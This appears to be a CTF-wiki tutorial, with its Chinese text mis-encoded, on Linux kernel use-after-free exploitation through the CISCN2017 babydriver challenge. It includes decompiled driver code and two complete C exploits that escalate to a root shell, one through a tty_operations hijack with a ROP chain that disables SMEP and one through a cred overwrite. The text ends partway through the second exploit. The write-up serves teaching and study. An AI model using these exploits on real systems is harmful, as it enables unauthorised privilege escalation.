# kernel UAF

UAF å³ Use After Freeï¼Œé€šå¸¸æŒ‡çš„æ˜¯**å¯¹äºé‡Šæ”¾åæœªé‡ç½®çš„å‚æ‚¬æŒ‡é’ˆçš„åˆ©ç”¨**ï¼Œæ­¤å‰åœ¨ç”¨æˆ·æ€ä¸‹çš„ heap é˜¶æ®µå¯¹äº ptmalloc çš„åˆ©ç”¨å¾ˆå¤šéƒ½æ˜¯åŸºäºUAFæ¼æ´è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚

åœ¨ CTF å½“ä¸­ï¼Œå†…æ ¸çš„â€œå †å†…å­˜â€ä¸»è¦æŒ‡çš„æ˜¯ç›´æ¥æ˜ å°„åŒºï¼ˆdirect mapping areaï¼‰ï¼Œå¸¸ç”¨çš„åˆ†é…å‡½æ•° kmalloc ä»æ­¤å¤„åˆ†é…å†…å­˜ï¼Œå¸¸ç”¨çš„åˆ†é…å™¨ä¸º slubï¼Œè‹¥æ˜¯åœ¨ kernel ä¸­å­˜åœ¨ç€å‚æ‚¬æŒ‡é’ˆï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥ä»¥æ­¤å®Œæˆå¯¹ slab/slub å†…å­˜åˆ†é…å™¨çš„åˆ©ç”¨ï¼Œé€šè¿‡ Kernel UAF å®Œæˆææƒã€‚

## å†…æ ¸å †åˆ©ç”¨ä¸ç»‘æ ¸

slub allocator ä¼šä¼˜å…ˆä»å½“å‰æ ¸å¿ƒçš„ `kmem_cache_cpu` ä¸­è¿›è¡Œå†…å­˜åˆ†é…ï¼Œåœ¨å¤šæ ¸æ¶æ„ä¸‹å­˜åœ¨å¤šä¸ª `kmem_cache_cpu` ï¼Œç”±äºè¿›ç¨‹è°ƒåº¦ç®—æ³•ä¼šä¿æŒæ ¸å¿ƒé—´çš„è´Ÿè½½å‡è¡¡ï¼Œå› æ­¤æˆ‘ä»¬çš„ exp è¿›ç¨‹å¯èƒ½ä¼šè¢«åœ¨ä¸åŒçš„æ ¸å¿ƒä¸Šè¿è¡Œï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†åˆ©ç”¨è¿‡ç¨‹ä¸­ kernel object çš„åˆ†é…æœ‰å¯èƒ½ä¼šæ¥è‡ªä¸åŒçš„ `kmem_cache_cpu` ï¼Œè¿™ä½¿å¾—åˆ©ç”¨æ¨¡å‹å˜å¾—å¤æ‚ï¼Œä¹Ÿé™ä½äº†æ¼æ´åˆ©ç”¨çš„æˆåŠŸç‡ã€‚

> æ¯”å¦‚è¯´ä½ åœ¨ core 0 ä¸Šæ•´äº†ä¸ª double freeï¼Œå‡†å¤‡ä¸‹ä¸€æ­¥åˆ©ç”¨æ—¶ exp è·‘åˆ° core 1å»äº†ï¼Œé‚£å°±å¾ˆå®¹æ˜“è®©äººæ‘¸ä¸ç€å¤´è„‘ :ï¼ˆ

å› æ­¤ä¸ºäº†ä¿è¯æ¼æ´åˆ©ç”¨çš„ç¨³å®šï¼Œ**æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬çš„è¿›ç¨‹ç»‘å®šåˆ°ç‰¹å®šçš„æŸä¸ª CPU æ ¸å¿ƒä¸Š**ï¼Œè¿™æ · slub allocator çš„æ¨¡å‹å¯¹æˆ‘ä»¬è€Œè¨€ä¾¿ç®€åŒ–æˆäº† `kmem_cache_node + kmem_cache_cpu` ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½æ›´åŠ æ–¹ä¾¿åœ°è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚

ç°ç¬”è€…ç»™å‡ºå¦‚ä¸‹å°† exp è¿›ç¨‹ç»‘å®šè‡³æŒ‡å®šæ ¸å¿ƒçš„æ¨¡æ¿ï¼š

```c
#include <sched.h>

/* to run the exp on the specific core only */
void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}
```

## é€šç”¨ kmalloc flag

`GFP_KERNEL` ä¸ `GFP_KERNEL_ACCOUNT`  æ˜¯å†…æ ¸ä¸­æœ€ä¸ºå¸¸è§ä¸é€šç”¨çš„åˆ†é… flagï¼Œå¸¸è§„æƒ…å†µä¸‹ä»–ä»¬çš„åˆ†é…éƒ½æ¥è‡ªåŒä¸€ä¸ª `kmem_cache` â€”â€”å³é€šç”¨çš„ `kmalloc-xx` ã€‚

è¿™ä¸¤ç§ flag çš„åŒºåˆ«ä¸»è¦åœ¨äº `GFP_KERNEL_ACCOUNT` æ¯” `GFP_KERNEL` å¤šäº†ä¸€ä¸ªå±æ€§â€”â€”**è¡¨ç¤ºè¯¥å¯¹è±¡ä¸æ¥è‡ªç”¨æˆ·ç©ºé—´çš„æ•°æ®ç›¸å…³è”**ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¸å¦‚ `msg_msg` ã€`pipe_buffer`ã€`sk_buffçš„æ•°æ®åŒ…` çš„åˆ†é…ä½¿ç”¨çš„éƒ½æ˜¯ `GFP_KERNEL_ACCOUNT` ï¼Œè€Œ `ldt_struct` ã€`packet_socket` ç­‰ä¸ç”¨æˆ·ç©ºé—´æ•°æ®æ²¡æœ‰ç›´æ¥å…³è”çš„ç»“æ„ä½“åˆ™ä½¿ç”¨ `GFP_KERNEL`ã€‚

åœ¨5.9 ç‰ˆæœ¬ä¹‹å‰`GFP_KERNEL` ä¸ `GFP_KERNEL_ACCOUNT` å­˜åœ¨éš”ç¦»æœºåˆ¶ï¼Œåœ¨ [è¿™ä¸ª commit](https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792) ä¸­å–æ¶ˆäº†éš”ç¦»æœºåˆ¶ï¼Œè‡ªå†…æ ¸ç‰ˆæœ¬ 5.14 èµ·ï¼Œåœ¨ [è¿™ä¸ª commit](https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552) å½“ä¸­åˆé‡æ–°å¼•å…¥ï¼š

- å¯¹äºå¼€å¯äº† `CONFIG_MEMCG_KMEM` ç¼–è¯‘é€‰é¡¹çš„ kernel è€Œè¨€ï¼ˆé€šå¸¸éƒ½æ˜¯é»˜è®¤å¼€å¯ï¼‰ï¼Œå…¶ä¼šä¸ºä½¿ç”¨ `GFP_KERNEL_ACCOUNT` è¿›è¡Œåˆ†é…çš„é€šç”¨å¯¹è±¡**åˆ›å»ºä¸€ç»„ç‹¬ç«‹çš„ `kmem_cache` â€”â€”åä¸º `kmalloc-cg-*`** ï¼Œä»è€Œå¯¼è‡´ä½¿ç”¨è¿™ä¸¤ç§ flag çš„ object ä¹‹é—´çš„éš”ç¦»ã€‚

## slub åˆå¹¶ & éš”ç¦»

slab alias æœºåˆ¶æ˜¯ä¸€ç§å¯¹åŒç­‰/ç›¸è¿‘å¤§å° object çš„ `kmem_cache` è¿›è¡Œ**å¤ç”¨**çš„ä¸€ç§æœºåˆ¶ï¼š

- å½“ä¸€ä¸ª `kmem_cache` åœ¨åˆ›å»ºæ—¶ï¼Œè‹¥å·²ç»å­˜åœ¨èƒ½åˆ†é…ç›¸ç­‰/è¿‘ä¼¼å¤§å°çš„ object çš„ `kmem_cache` ï¼Œåˆ™**ä¸ä¼šåˆ›å»ºæ–°çš„ kmem\_cacheï¼Œè€Œæ˜¯ä¸ºåŸæœ‰çš„ kmem\_cache èµ·ä¸€ä¸ª aliasï¼Œä½œä¸ºâ€œæ–°çš„â€ kmem\_cache è¿”å›**ã€‚

ä¸¾ä¸ªğŸŒ°ï¼Œ`cred_jar` æ˜¯ä¸“é—¨ç”¨ä»¥åˆ†é… `cred` ç»“æ„ä½“çš„ `kmem_cache`ï¼Œåœ¨ Linux 4.4 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶ä¸º `kmalloc-192` çš„ aliasï¼Œå³ cred ç»“æ„ä½“ä¸å…¶ä»–çš„ 192 å¤§å°çš„ object éƒ½ä¼šä»åŒä¸€ä¸ª `kmem_cache`â€”â€”`kmalloc-192` ä¸­åˆ†é…ã€‚

å¯¹äºåˆå§‹åŒ–æ—¶è®¾ç½®äº† `SLAB_ACCOUNT` è¿™ä¸€ flag çš„ `kmem_cache` è€Œè¨€ï¼Œåˆ™ä¼šæ–°å»ºä¸€ä¸ªæ–°çš„ `kmem_cache` è€Œéä¸ºåŸæœ‰çš„å»ºç«‹ aliasï¼ŒğŸŒ°å¦‚åœ¨æ–°ç‰ˆçš„å†…æ ¸å½“ä¸­ `cred_jar` ä¸ `kmalloc-192` ä¾¿æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ `kmem_cache`ï¼Œ**å½¼æ­¤ä¹‹é—´äº’ä¸å¹²æ‰°**ã€‚

## ä¾‹é¢˜ï¼šCISCN2017 - babydriver
[attachment here](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)

### åˆ†æ
å…ˆè§£å‹ rootfs.cpio çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶
```bash
CISCN2017_babydriver [masterâ—] mkdir core
CISCN2017_babydriver [masterâ—] cd core 
core [masterâ—] mv ../rootfs.cpio rootfs.cpio.gz
core [masterâ—â—] gunzip ./rootfs.cpio.gz 
core [masterâ—] ls
rootfs.cpio
core [masterâ—] cpio -idmv < rootfs.cpio 
.
etc
etc/init.d
etc/passwd
etc/group
...
...
usr/sbin/rdev
usr/sbin/ether-wake
tmp
linuxrc
home
home/ctf
5556 å—
core [masterâ—] ls
bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr
core [masterâ—] bat init
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: init
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚ #!/bin/sh
   2   â”‚
   3   â”‚ mount -t proc none /proc
   4   â”‚ mount -t sysfs none /sys
   5   â”‚ mount -t devtmpfs devtmpfs /dev
   6   â”‚ chown root:root flag
   7   â”‚ chmod 400 flag
   8   â”‚ exec 0</dev/console
   9   â”‚ exec 1>/dev/console
  10   â”‚ exec 2>/dev/console
  11   â”‚
  12   â”‚ insmod /lib/modules/4.4.72/babydriver.ko
  13   â”‚ chmod 777 /dev/babydev
  14   â”‚ echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
  15   â”‚ setsid cttyhack setuidgid 1000 sh
  16   â”‚
  17   â”‚ umount /proc
  18   â”‚ umount /sys
  19   â”‚ poweroff -d 0  -f
  20   â”‚
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```
æ ¹æ® init çš„å†…å®¹ï¼Œ12 è¡ŒåŠ è½½äº† `babydriver.ko` è¿™ä¸ªé©±åŠ¨ï¼Œæ ¹æ® pwn çš„ä¸€èˆ¬å¥—è·¯ï¼Œè¿™ä¸ªå°±æ˜¯æœ‰æ¼æ´çš„ LKM äº†ã€‚init çš„å…¶ä»–å‘½ä»¤éƒ½æ˜¯ linux å¸¸ç”¨çš„å‘½ä»¤ï¼Œå°±ä¸å†è§£é‡Šäº†ã€‚

æŠŠè¿™ä¸ªé©±åŠ¨æ–‡ä»¶æ‹¿å‡ºæ¥ã€‚

```bash
core [masterâ—] cp ./lib/modules/4.4.72/babydriver.ko ..
core [masterâ—] cd ..
CISCN2017_babydriver [masterâ—] check ./babydriver.ko
./babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped
[*] '/home/m4x/pwn_repo/CISCN2017_babydriver/babydriver.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```
æ²¡æœ‰å¼€ PIEï¼Œæ—  canary ä¿æŠ¤ï¼Œæ²¡æœ‰å»é™¤ç¬¦å·è¡¨ï¼Œå¾ˆ niceã€‚

ç”¨ IDA æ‰“å¼€åˆ†æï¼Œæ—¢ç„¶æ²¡æœ‰å»é™¤ç¬¦å·è¡¨ï¼Œshift + F9 å…ˆçœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆç»“æ„ä½“ï¼Œå¯ä»¥å‘ç°å¦‚ä¸‹çš„ç»“æ„ä½“ï¼š
```asm
00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)
00000000                                         ; XREF: .bss:babydev_struct/r
00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r
00000000                                         ; babyopen+26/w ... ; offset
00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w
00000008                                         ; babyioctl+3C/w ...
00000010 babydevice_t    ends
00000010
```

å†çœ‹ä¸€ä¸‹ä¸»è¦å‡½æ•°

**babyioctl:** å®šä¹‰äº† 0x10001 çš„å‘½ä»¤ï¼Œå¯ä»¥é‡Šæ”¾å…¨å±€å˜é‡ babydev\_struct ä¸­çš„ device\_bufï¼Œå†æ ¹æ®ç”¨æˆ·ä¼ é€’çš„ size é‡æ–°ç”³è¯·ä¸€å—å†…å­˜ï¼Œå¹¶è®¾ç½® device\_buf\_lenã€‚
```C
// local variable allocation has failed, the output may be wrong!
void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx

  _fentry__(filp, *(_QWORD *)&command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 0x24000C0LL, v5);
  }
  else
  {
    printk("\x013defalut:arg is %ld\n", v3, v3);
  }
}
```

**babyopen:** ç”³è¯·ä¸€å—ç©ºé—´ï¼Œå¤§å°ä¸º 0x40 å­—èŠ‚ï¼Œåœ°å€å­˜å‚¨åœ¨å…¨å±€å˜é‡ babydev\_struct.device\_buf ä¸Šï¼Œå¹¶æ›´æ–° babydev\_struct.device\_buf\_len
```C
int __fastcall babyopen(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n", 0x24000C0LL, v2);
  return 0;
}
```

**babyread:** å…ˆæ£€æŸ¥é•¿åº¦æ˜¯å¦å°äº babydev\_struct.device\_buf\_lenï¼Œç„¶åæŠŠ babydev\_struct.device\_buf ä¸­çš„æ•°æ®æ‹·è´åˆ° buffer ä¸­ï¼Œbuffer å’Œé•¿åº¦éƒ½æ˜¯ç”¨æˆ·ä¼ é€’çš„å‚æ•°
```C
void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_to_user(buffer, babydev_struct.device_buf, v4);
  }
}
```

**babywrite:** ç±»ä¼¼ babyreadï¼Œä¸åŒçš„æ˜¯ä» buffer æ‹·è´åˆ°å…¨å±€å˜é‡ä¸­
```C
void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_from_user(babydev_struct.device_buf, buffer, v4);
  }
}
```

**babyrelease:** é‡Šæ”¾ç©ºé—´ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„
```C
int __fastcall babyrelease(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp, v2);
  return 0;
}
```

è¿˜æœ‰ babydriver\_init() å’Œ babydriver\_exit() ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«å®Œæˆäº† **/dev/babydev** è®¾å¤‡çš„åˆå§‹åŒ–å’Œæ¸…ç†ï¼ŒæŸ¥ä¸€ä¸‹å‡½æ•°çš„ç”¨æ³•å³å¯ï¼Œä¸å†åˆ†æã€‚

### æ€è·¯

æ²¡æœ‰ç”¨æˆ·æ€ä¼ ç»Ÿçš„æº¢å‡ºç­‰æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€ä¸ªä¼ªæ¡ä»¶ç«äº‰å¼•å‘çš„ UAF æ¼æ´ï¼š

- å¦‚æœæˆ‘ä»¬åŒæ—¶æ‰“å¼€ä¸¤ä¸ªè®¾å¤‡ï¼Œç¬¬äºŒæ¬¡ä¼šè¦†ç›–ç¬¬ä¸€æ¬¡åˆ†é…çš„ç©ºé—´ï¼Œå› ä¸º babydev\_struct æ˜¯å…¨å±€çš„ã€‚åŒæ ·ï¼Œå¦‚æœé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå…¶å®æ˜¯è¢«æ˜¯é‡Šæ”¾è¿‡çš„ï¼Œè¿™æ ·å°±é€ æˆäº†ä¸€ä¸ª UAFã€‚

æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•é€šè¿‡ UAF åŠ«æŒç¨‹åºæ‰§è¡Œæµï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹© `tty_struct` ç»“æ„ä½“ä½œä¸º victim objectã€‚

åœ¨ ```/dev``` ä¸‹æœ‰ä¸€ä¸ªä¼ªç»ˆç«¯è®¾å¤‡ ```ptmx``` ï¼Œåœ¨æˆ‘ä»¬æ‰“å¼€è¿™ä¸ªè®¾å¤‡æ—¶å†…æ ¸ä¸­ä¼šåˆ›å»ºä¸€ä¸ª ```tty_struct``` ç»“æ„ä½“ï¼Œä¸å…¶ä»–ç±»å‹è®¾å¤‡ç›¸åŒï¼Œttyé©±åŠ¨è®¾å¤‡ä¸­åŒæ ·å­˜åœ¨ç€ä¸€ä¸ªå­˜æ”¾ç€å‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“ ``` tty_operations ```ã€‚

é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF åŠ«æŒ ```/dev/ptmx``` è¿™ä¸ªè®¾å¤‡çš„ ```tty_struct``` ç»“æ„ä½“ä¸å…¶å†…éƒ¨çš„ ```tty_operations``` å‡½æ•°è¡¨ï¼Œé‚£ä¹ˆåœ¨æˆ‘ä»¬å¯¹è¿™ä¸ªè®¾å¤‡è¿›è¡Œç›¸åº”æ“ä½œï¼ˆå¦‚writeã€ioctlï¼‰æ—¶ä¾¿ä¼šæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®å¥½çš„æ¶æ„å‡½æ•°æŒ‡é’ˆã€‚

ç”±äºæ²¡æœ‰å¼€å¯SMAPä¿æŠ¤ï¼Œæ•…æˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·æ€è¿›ç¨‹çš„æ ˆä¸Šå¸ƒç½®ROPé“¾ä¸ ```fake tty_operations``` ç»“æ„ä½“ã€‚

> ç»“æ„ä½“ ```tty_struct```ä½äº```include/linux/tty.h``` ä¸­ï¼Œ```tty_operations``` ä½äº ```include/linux/tty_driver.h``` ä¸­ã€‚
 
å†…æ ¸ä¸­æ²¡æœ‰ç±»ä¼¼ ```one_gadget``` ä¸€ç±»çš„ä¸œè¥¿ï¼Œå› æ­¤ä¸ºäº†å®ŒæˆROPæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡**æ ˆè¿ç§»**

ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼Œè§‚å¯Ÿå†…æ ¸åœ¨è°ƒç”¨æˆ‘ä»¬çš„æ¶æ„å‡½æ•°æŒ‡é’ˆæ—¶å„å¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œé€‰æ‹©åŠ«æŒ ```tty_operaionts``` ç»“æ„ä½“åˆ°ç”¨æˆ·æ€çš„æ ˆä¸Šï¼Œå¹¶é€‰æ‹©ä»»æ„ä¸€æ¡å†…æ ¸gadgetä½œä¸ºfake ttyå‡½æ•°æŒ‡é’ˆä»¥æ–¹ä¾¿ä¸‹æ–­ç‚¹ï¼š

![image.png](figure/ttyops_debug.png)

æˆ‘ä»¬ä¸éš¾è§‚å¯Ÿåˆ°ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨```tty_operations->write```æ—¶ï¼Œ**å…¶raxå¯„å­˜å™¨ä¸­å­˜æ”¾çš„ä¾¿æ˜¯tty\_operationsç»“æ„ä½“çš„åœ°å€**ï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåœ¨å†…æ ¸ä¸­æ‰¾åˆ°å½¢å¦‚```mov rsp, rax```çš„gadgetï¼Œä¾¿èƒ½å¤ŸæˆåŠŸåœ°å°†æ ˆè¿ç§»åˆ°```tty_operations```ç»“æ„ä½“çš„å¼€å¤´ã€‚

ä½¿ç”¨ROPgadgetæŸ¥æ‰¾ç›¸å…³gadgetï¼Œå‘ç°æœ‰ä¸¤æ¡ç¬¦åˆæˆ‘ä»¬è¦æ±‚çš„gadgetï¼š

![image.png](figure/ttygadget.png)

gdbè°ƒè¯•ï¼Œå‘ç°ç¬¬ä¸€æ¡gadgetå…¶å®ç­‰ä»·äº```mov rsp, rax ; dec ebx ; ret```ï¼š

![image.png](figure/ttygadget2.png)

é‚£ä¹ˆåˆ©ç”¨è¿™æ¡gadgetæˆ‘ä»¬ä¾¿å¯ä»¥å¾ˆå¥½åœ°å®Œæˆæ ˆè¿ç§»çš„è¿‡ç¨‹ï¼Œæ‰§è¡Œæˆ‘ä»¬æ‰€æ„é€ çš„ROPé“¾ã€‚

è€Œ```tty_operations```ç»“æ„ä½“å¼€å¤´åˆ°å…¶writeæŒ‡é’ˆé—´çš„ç©ºé—´è¾ƒå°ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦è¿›è¡ŒäºŒæ¬¡æ ˆè¿ç§»ï¼Œè¿™é‡Œéšä¾¿é€‰ä¸€æ¡æ”¹raxçš„gadgetå³å¯ï¼š

![image.png](figure/ttygadget3.png)

### Exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef

size_t commit_creds = NULL, prepare_kernel_cred = NULL;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void getRootPrivilige(void)
{
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

void getRootShell(void)
{   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

int main(void)
{
    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");
    saveStatus();

    //get the addr
    FILE* sym_table_fd = fopen("/proc/kallsyms", "r");
    if(sym_table_fd < 0)
    {
        printf("\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n");
        exit(-1);
    }
    char buf[0x50], type[0x10];
    size_t addr;
    while(fscanf(sym_table_fd, "%llx%s%s", &addr, type, buf))
    {
        if(prepare_kernel_cred && commit_creds)
            break;

        if(!commit_creds && !strcmp(buf, "commit_creds"))
        {
            commit_creds = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n", commit_creds);
            continue;
        }

        if(!strcmp(buf, "prepare_kernel_cred"))
        {
            prepare_kernel_cred = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n", prepare_kernel_cred);
            continue;
        }
    }

    size_t rop[0x20], p = 0;
    rop[p++] = POP_RDI_RET;
    rop[p++] = 0x6f0;
    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = getRootPrivilige;
    rop[p++] = SWAPGS_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = IRETQ_RET;
    rop[p++] = getRootShell;
    rop[p++] = user_cs;
    rop[p++] = user_rflags;
    rop[p++] = user_sp;
    rop[p++] = user_ss;

    size_t fake_op[0x30];
    for(int i = 0; i < 0x10; i++)
        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;

    fake_op[0] = POP_RAX_RET;
    fake_op[1] = rop;

    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    size_t fake_tty[0x20];
    int fd3 = open("/dev/ptmx", 2);
    read(fd2, fake_tty, 0x40);
    fake_tty[3] = fake_op;
    write(fd2, fake_tty, 0x40);

    write(fd3, buf, 0x8);

    return 0;
}
```

### Old Solution

è¿™é“é¢˜åœ¨å½“å¹´çš„è§£æ³•æ˜¯**é€šè¿‡ UAF ä¿®æ”¹è¯¥è¿›ç¨‹çš„ cred ç»“æ„ä½“çš„ uidã€gid ä¸º0**ï¼Œååˆ†ç®€å•ååˆ†ç™½ç»™ã€‚

ä½†æ˜¯**æ­¤ç§æ–¹æ³•åœ¨è¾ƒæ–°ç‰ˆæœ¬ kernel ä¸­å·²ä¸å¯è¡Œï¼Œæˆ‘ä»¬å·²æ— æ³•ç›´æ¥åˆ†é…åˆ° cred\_jar ä¸­çš„ object**ï¼Œè¿™æ˜¯å› ä¸º cred\_jar åœ¨åˆ›å»ºæ—¶è®¾ç½®äº† `SLAB_ACCOUNT` æ ‡è®°ï¼Œåœ¨ `CONFIG_MEMCG_KMEM=y` æ—¶ï¼ˆé»˜è®¤å¼€å¯ï¼‰**cred\_jar ä¸ä¼šå†ä¸ç›¸åŒå¤§å°çš„ kmalloc-192 è¿›è¡Œåˆå¹¶**

> æ¥è‡ªå†…æ ¸æºç  4.5 `kernel/cred.c`
>
> ```c
> void __init cred_init(void)
> {
> 	/* allocate a slab in which we can store credentials */
> 	cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
> 			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
> }
> ```
>
> æœ¬é¢˜ï¼ˆ4.4.72ï¼‰ï¼š
>
> ```c
> void __init cred_init(void)
> {
> 	/* allocate a slab in which we can store credentials */
> 	cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred),
> 				     0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
> }
> ```

å› æ­¤è¿™é‡Œè€ƒè™‘ä»‹ç»æ›´åŠ é€šç”¨çš„è§£æ³•ï¼Œå¯¹æ—§çš„è§£æ³•æ„Ÿå…´è¶£çš„å¯ä»¥å‚è€ƒå¦‚ä¸‹expï¼š

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

int main(void)
{
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");

    ioctl(fd1, 0x10001, 0xa8); /* object to be reused as the child's cred */
    close(fd1);

    int pid = fork();

    if(pid < 0) {
        printf("\033[31m\033[1m[x] Unable to fork.\033[0m\n");
        return -1;
    }
    else if(pid == 0) { /* the child to get the UAF cred */
        char buf[30];

        memset(buf, '\0', sizeof(buf));
        write(fd2, buf, 28);  /* overwrite uid&gid to 0 directly */

        if(getuid() == 0) {
            puts("\033[32m\033[1m[+] Successful to get the root.\033[0m\n");
            system("/bin/sh");
            return 0;
        } else {
            printf("\033[31m\033[1m[x] Failed to get the root.\033[0m\n");
            return -1;
        }
    }
    else { /* the parent */
        wait(NULL); /* waiting for the child to be done */
    }

